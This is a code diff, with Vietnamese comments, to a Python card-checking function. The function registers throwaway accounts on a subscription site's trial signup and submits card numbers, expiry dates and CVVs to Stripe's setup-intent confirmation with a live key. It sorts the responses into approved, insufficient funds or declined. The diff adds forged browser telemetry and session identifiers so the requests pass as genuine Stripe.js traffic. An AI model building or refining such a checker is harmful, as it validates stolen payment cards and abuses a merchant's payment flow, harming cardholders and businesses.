@@ -18,8 +18,6 @@ HEADERS = {
 
 # ========== HÀM XỬ LÝ THẺ ========== #
 async def process_card(cc, mes, ano, cvv, user_id=None):
-    import random, string
-
     def random_email():
         prefix = ''.join(random.choices(string.ascii_lowercase, k=18))
         return f"{prefix}62@gmail.com"
@@ -41,10 +39,12 @@ async def process_card(cc, mes, ano, cvv, user_id=None):
             "Accept": "*/*"
         }
 
+        # Tạo user
         r1 = requests.post("https://app.practice.do/api/v1/users/create", json=payload1, headers=headers_json)
         if "Email already in use" in r1.text:
             return "❌ Email đã được sử dụng."
 
+        # Lấy token đăng nhập
         r2 = requests.post(
             "https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=AIzaSyChZfnLzMeEIDjQ8XSw3y9sO7jp0O4lkIk",
             json={
@@ -76,6 +76,7 @@ async def process_card(cc, mes, ano, cvv, user_id=None):
         d = r3.json().get("clientSecret", "")
         n = src.split("\"clientSecret\":\"")[1].split("_secret_")[0]
 
+        # Gửi lên Stripe đúng chuẩn
         form_data = {
             "return_url": f"https://app.practice.do/start-trial?step=2&email={email}&planInformation=%257B%2522name%2522%253A%2522Basic%2522%252C%2522priceId%2522%253A%2522price_1O9UHlDXXMkswpxpZ6L912U1%2522%252C%2522tier%2522%253A%2522basic%2522%252C%2522frequency%2522%253A%2522month%2522%252C%2522amount%2522%253A5%252C%2522currency%2522%253A%2522usd%2522%257D",
             "payment_method_data[type]": "card",
@@ -83,30 +84,53 @@ async def process_card(cc, mes, ano, cvv, user_id=None):
             "payment_method_data[card][cvc]": cvv,
             "payment_method_data[card][exp_year]": ano,
             "payment_method_data[card][exp_month]": mes,
+            "payment_method_data[allow_redisplay]": "unspecified",
             "payment_method_data[billing_details][address][country]": "VN",
+            "payment_method_data[pasted_fields]": "number",
+            "payment_method_data[payment_user_agent]": "stripe.js/2b21fdf9ae; stripe-js-v3/2b21fdf9ae; payment-element",
+            "payment_method_data[referrer]": "https://app.practice.do",
+            "payment_method_data[time_on_page]": "15258",
+            "payment_method_data[client_attribution_metadata][client_session_id]": "7308a4fd-b6e8-4919-8480-f8c9baf770e0",
+            "payment_method_data[client_attribution_metadata][merchant_integration_source]": "elements",
+            "payment_method_data[client_attribution_metadata][merchant_integration_subtype]": "payment-element",
+            "payment_method_data[client_attribution_metadata][merchant_integration_version]": "2021",
+            "payment_method_data[client_attribution_metadata][payment_intent_creation_flow]": "standard",
+            "payment_method_data[client_attribution_metadata][payment_method_selection_flow]": "merchant_specified",
+            "payment_method_data[guid]": "f8f17c37-ca8b-4c7c-bdf0-6b8cd5bd2ab25eb368",
+            "payment_method_data[muid]": "c2de6ae0-e50e-4547-bb09-debe6a55ec13709f78",
+            "payment_method_data[sid]": "9d49c487-2b7a-47d2-9b3b-264f73b4073d616e77",
+            "expected_payment_method_type": "card",
             "use_stripe_sdk": "true",
             "key": "pk_live_8vuRcdG8hx5kBi7MTtoqIeCc00alpMFwtE",
             "client_secret": d
         }
-
-        r4 = requests.post(f"https://api.stripe.com/v1/setup_intents/{n}/confirm", data=form_data, headers=headers_json)
+        headers_form = {
+            "Content-Type": "application/x-www-form-urlencoded",
+            "User-Agent": headers_json["User-Agent"],
+            "Pragma": "no-cache",
+            "Accept": "*/*"
+        }
+        r4 = requests.post(f"https://api.stripe.com/v1/setup_intents/{n}/confirm", data=form_data, headers=headers_form)
         j4 = r4.json()
-        status = j4.get("payment_method", {}).get("status") or j4.get("status", "UNKNOWN")
-        decline = j4.get("error", {}).get("decline_code") or "NONE"
+        status = j4.get("status", "UNKNOWN")
+        decline = j4.get("decline_code", "NONE")
 
-        # Phân loại trạng thái kết quả Stripe
+        # Phân loại trạng thái trả về đúng chuẩn
+        status_label = "❓ Unknown Status"
         if status == "succeeded":
             status_label = "✅ Approved"
-        elif status in ["requires_action", "requires_source_action", "requires_confirmation"]:
+        elif status in ["requires_action", "requires_source_action"]:
             status_label = "⚠️ Requires 3DS / Action"
         elif decline == "insufficient_funds":
             status_label = "⚠️ Insufficient Funds"
         elif decline in ["incorrect_cvc", "invalid_cvc"]:
             status_label = "⚠️ Invalid CVC"
-        elif decline != "NONE":
+        elif decline in [
+            "transaction_not_allowed", "generic_decline", "fraudulent", "live_mode_test_card",
+            "incorrect_number", "card_not_supported", "pickup_card", "processing_error",
+            "do_not_honor", "stolen_card", "invalid_account"
+        ] or status == "requires_payment_method":
             status_label = "❌ Declined"
-        else:
-            status_label = "❓ Unknown Status"
 
         # Check BIN
         bin_code = cc[:6]
